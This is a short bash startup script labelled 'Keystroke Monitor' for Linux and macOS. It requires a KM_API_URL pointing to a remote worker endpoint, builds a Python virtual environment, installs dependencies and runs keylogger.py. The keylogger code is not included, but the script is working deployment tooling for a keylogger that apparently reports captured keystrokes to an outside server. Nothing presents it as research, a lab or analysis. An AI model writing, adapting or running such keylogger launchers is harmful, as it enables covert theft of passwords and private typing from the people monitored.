#!/bin/bash
# Keystroke Monitor - Linux/macOS Startup Script
# Run: bash start.sh

# Set your Worker URL before running
if [ -z "$KM_API_URL" ]; then
    echo "ERROR: Set KM_API_URL first. Example:"
    echo '  export KM_API_URL="https://your-worker.your-subdomain.workers.dev"'
    exit 1
fi

cd "$(dirname "$0")"

if [ -d ".venv" ]; then
    source .venv/bin/activate
else
    python3 -m venv .venv
    source .venv/bin/activate
    pip install -r requirements.txt
fi

python keylogger.py
